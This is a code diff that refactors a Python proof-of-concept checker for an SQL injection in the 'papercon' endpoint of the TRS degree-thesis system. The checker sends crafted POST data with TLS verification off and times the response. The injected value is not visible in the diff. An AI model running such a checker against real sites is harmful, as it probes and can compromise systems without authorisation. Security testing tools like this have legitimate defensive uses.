@@ -11,14 +11,7 @@ import time
 import json
 import requests
 import warnings
-  
-
-
-class lunwen_papercon_sqli:
-    def __init__(self, url):
-        self.url = url
-
-    def run(self):
+def run(url):
         result = ['TRS学位论文系统papercon处SQL注入','','']
         headers = {
             "User-Agent":"Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_8; en-us) AppleWebKit/534.50 (KHTML, like Gecko) Version/5.1 Safari/534.50"
@@ -31,7 +24,7 @@ class lunwen_papercon_sqli:
             "password":"dsdfaf"
         }
         payload = "/papercon"
-        vulnurl = self.url + payload
+        vulnurl = url + payload
         start_time = time.time()
         try:
             req = requests.post(vulnurl, data=post_data, headers=headers, timeout=10, verify=False)
@@ -47,5 +40,5 @@ class lunwen_papercon_sqli:
 
 if __name__ == "__main__":
     warnings.filterwarnings("ignore")
-    testVuln = lunwen_papercon_sqli(sys.argv[1])
-    testVuln.run()
+    testVuln = run(sys.argv[1])
+    
